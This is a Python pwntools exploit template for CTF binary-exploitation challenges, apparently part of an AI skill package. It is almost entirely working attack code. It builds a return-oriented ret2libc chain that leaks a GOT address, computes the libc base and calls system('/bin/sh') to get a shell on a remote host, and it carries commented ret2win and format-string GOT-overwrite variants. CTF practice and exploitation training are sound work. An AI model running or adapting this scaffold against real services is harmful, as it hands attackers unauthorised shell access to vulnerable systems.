#!/usr/bin/env python3
"""
pwn_template.py — pwntools exploit skeleton for the ctf-pwn sub-skill.

Fill in OFFSET and the chosen track. Run local first (LOCAL=1), then remote.
Best practices baked in: auto context from the binary, libc helper, GOT-leak
ret2libc scaffold, alignment ret, robust comms.

    LOCAL=1 python3 pwn_template.py            # local sandbox
    python3 pwn_template.py HOST PORT          # remote
"""
import os
import sys
from pwn import *  # noqa: F401,F403

BINARY = "./chal"
LIBC = "./libc.so.6"          # set to provided libc, else None
context.binary = ELF(BINARY, checksec=False)
context.log_level = "info"
context.terminal = ["tmux", "splitw", "-h"]

elf = context.binary
libc = ELF(LIBC, checksec=False) if LIBC and os.path.exists(LIBC) else None

OFFSET = 0  # <-- set via: cyclic 200 ; cyclic -l <crash value>


def start():
    if len(sys.argv) >= 3:
        return remote(sys.argv[1], int(sys.argv[2]))
    if os.environ.get("LOCAL") == "1":
        return process(BINARY)
    if args.GDB:
        return gdb.debug(BINARY, gdbscript="b *main\nc")
    return process(BINARY)


def leak_libc(io, leak_func="puts", got_sym="puts", main_sym="main"):
    """Stage 1: leak a GOT entry, return to main, compute libc base."""
    rop = ROP(elf)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    ret = rop.find_gadget(["ret"])[0]  # stack alignment
    payload = flat(
        b"A" * OFFSET,
        pop_rdi, elf.got[got_sym],
        elf.plt[leak_func],
        elf.symbols[main_sym],
    )
    io.sendlineafter(b":", payload)  # adjust prompt
    io.recvline()
    leaked = u64(io.recvline().strip().ljust(8, b"\x00"))
    if libc:
        libc.address = leaked - libc.symbols[got_sym]
        log.success(f"libc base = {hex(libc.address)}")
    return leaked, ret


def exploit():
    io = start()

    # --- TRACK A: ret2win ---------------------------------------------------
    # win = elf.symbols["win"]; ret = ...find ret gadget...
    # io.sendlineafter(b":", flat(b"A"*OFFSET, ret, win))

    # --- TRACK B: ret2libc (needs libc) ------------------------------------
    if libc:
        _, ret = leak_libc(io)
        rop = ROP(libc)
        pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
        binsh = next(libc.search(b"/bin/sh\x00"))
        payload = flat(
            b"A" * OFFSET,
            ret,                      # 16-byte alignment for movaps
            pop_rdi, binsh,
            libc.symbols["system"],
        )
        io.sendlineafter(b":", payload)

    # --- TRACK C: format string --------------------------------------------
    # payload = fmtstr_payload(OFFSET, {elf.got["exit"]: elf.symbols["win"]})
    # io.sendlineafter(b":", payload)

    io.interactive()


if __name__ == "__main__":
    exploit()
